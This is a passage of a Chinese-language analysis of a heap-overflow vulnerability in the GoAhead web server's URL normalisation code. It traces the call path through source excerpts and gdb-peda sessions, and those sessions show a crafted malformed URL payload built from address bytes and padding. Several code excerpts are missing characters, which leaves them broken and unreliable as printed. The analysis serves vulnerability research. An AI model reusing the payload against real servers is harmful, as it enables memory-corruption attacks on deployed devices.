    ```
可以看到，此时已经出发了corrupted unsorted
chunks，这个是glibc在新版本后引入用于对抗unlink时指针欺骗的，但是不要紧，这个在利用中是可以绕过的，在分析时我们不关心。
但是由此可见，这时已经触发了unlink操作，接下来，根据bt回溯情况，来分析整个漏洞的成因。首先从main函数来跟踪一下调用情况，首先是在goahead.c中。
    ```
        while (!finished || !*finished) {
            if (socketSelect(-1, delay)) {
                socketProcess();  open a socket process
            }
    ```
首先在main函数中，会启用socketProcess，也就是启用Socket进程，接下来进入http.c中。
    ```
    PUBLIC void socketProcess()
    {
        WebsSocket    *sp;
        int         sid;
        for (sid = 0; sid currentEvents & sp->handlerMask) {
                    socketDoEvent(sp);   if sid then do event
                }
            }
        }
    }
    ```
在进程中，会调用一个socket事件，接着往里跟踪。
    ```
        if (sp->handler && (sp->handlerMask & sp->currentEvents)) {
            (sp->handler)(sid, sp->handlerMask & sp->currentEvents, sp->handler_data);
            /*
                Make sure socket pointer is still valid, then reset the currentEvents.
             */ 
            if (socketList && sid currentEvents = 0;  create a socket handler
            }
    ```
这里会对sid进程句柄进行一些简单的判断，然后就会进入关键函数调用了。
    ```
    static bool parseIncoming(Webs *wp)
    {
        WebsBuf     *rxbuf;
        char        *end, c;
        rxbuf = &wp->rxbuf;
        while (*rxbuf->servp == 'r' || *rxbuf->servp == 'n') {
            bufGetc(rxbuf);
        }
        if ((end = strstr((char*) wp->rxbuf.servp, "rnrn")) == 0) {
            if (bufLen(&wp->rxbuf) >= BIT_GOAHEAD_LIMIT_HEADER) {
                websError(wp, HTTP_CODE_REQUEST_TOO_LARGE | WEBS_CLOSE, "Header too large");
                return 1;
            }
            return 0;
        }    
        trace(3 | WEBS_RAW_MSG, "nrxbuf.servp);
        *end = c;
        /*
            Parse the first line of the Http header
         */
        parseFirstLine(wp);
    ```
在函数中，会调用parseFirstLine函数，这个函数有一个参数，是一个结构体Webs。
    ```
    typedef struct Webs {
        WebsBuf         rxbuf;              /**path = websNormalizeUriPath(path)) == 0) {
            error("Cannot normalize URL: %s", url);
            websError(wp, HTTP_CODE_BAD_REQUEST | WEBS_CLOSE | WEBS_NOLOG, "Bad URL");
            wfree(buf);
            return;
        }
    ```
根据我们上面的回溯部分，可以看到函数中websNormalizeUriPath函数是漏洞触发的主要函数，它的参数path是数据包中我们构造的畸形字符串，而它又是从哪里来的呢？
注意一下上面的websUrlParse函数，中间会对path进行处理，下面动态调试。在websUrlParse下断点。
    ```
    gdb-peda$ b websUrlParse
    Breakpoint 1 at 0xb7fb5fd0: file src/http.c, line 3027.
    gdb-peda$ c
    Continuing.
    [----------------------------------registers-----------------------------------]
    EAX: 0xbffff2c0 --> 0xbffff320 --> 0x2 
    EBX: 0xb7fd8480 --> 0x30328 
    ECX: 0xb7eec420 --> 0x0 
    EDX: 0x0 
    ESI: 0x805ddd3 ("HTTP/1.0")
    EDI: 0xb7fd94ec --> 0x2 
    EBP: 0x805d8ac ("/%79%05%08%2F%79%05%08%98%F2%FF%BF%3F%79%05%08", 'A' ...)
    ESP: 0xbffff25c --> 0xb7fb8a9c (:      add    esp,0x30)
    EIP: 0xb7fb5fd0 (: push   ebp)
    EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
    [-------------------------------------code-------------------------------------]
       0xb7fb5fcd:        nop
       0xb7fb5fce:        nop
       0xb7fb5fcf:         nop
    => 0xb7fb5fd0 :     push   ebp
       0xb7fb5fd1 :         push   edi
       0xb7fb5fd2 :         push   esi
       0xb7fb5fd3 :         push   ebx
       0xb7fb5fd4 :         call   0xb7fae4a0 
    [------------------------------------stack-------------------------------------]
    0000| 0xbffff25c --> 0xb7fb8a9c (:  add    esp,0x30)
    0004| 0xbffff260 --> 0x805d8ac ("/%79%05%08%2F%79%05%08%98%F2%FF%BF%3F%79%05%08", 'A' ...)
    0008| 0xbffff264 --> 0xbffff2c0 --> 0xbffff320 --> 0x2 
    0012| 0xbffff268 --> 0x0 
    0016| 0xbffff26c --> 0xbffff2ac --> 0x0 
    0020| 0xbffff270 --> 0xbffff2b8 --> 0x0 
    0024| 0xbffff274 --> 0xbffff2b4 --> 0x0 
    0028| 0xbffff278 --> 0xbffff2bc --> 0x0 
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value
    Breakpoint 1, websUrlParse (
        url=0x805d8ac "/%79%05%08%2F%79%05%08%98%F2%FF%BF%3F%79%05%08", 'A' ..., pbuf=0xbffff2c0, pprotocol=0x0, phost=0xbffff2ac, 
        pport=0xbffff2b8, ppath=0xbffff2b4, pext=0xbffff2bc, preference=0x0, 
        pquery=0xbffff2b0) at src/http.c:3027
    3027         {
    gdb-peda$ x/10x 0xbffff2b4
    0xbffff2b4:        0x00000000     0x00000000     0x00000000     0xbffff320
    0xbffff2c4:        0xb7fecc9f        0xb7fdbb00      0x00000000     0x00000001
    0xbffff2d4:        0x00000001     0x00000000
    ```
可以看到，此时url已经传入了畸形字符串，函数中，会对这个字符串进行各种处理，把它们处理后交给其他输出变量。
注意bffff2b4处的变量。接下来直接执行到函数返回的位置。
    ```
    gdb-peda$ b *0xb7fb61be
    Breakpoint 2 at 0xb7fb61be: file src/http.c, line 3162.
    gdb-peda$ c
    Continuing.
    [----------------------------------registers-----------------------------------]
    EAX: 0x0 
    EBX: 0xb7fd8480 --> 0x30328 
    ECX: 0xbffff2b0 --> 0xb7fc90f7 --> 0x74746800 ('')
    EDX: 0x0 
    ESI: 0x805ddd3 ("HTTP/1.0")
    EDI: 0xb7fd94ec --> 0x2 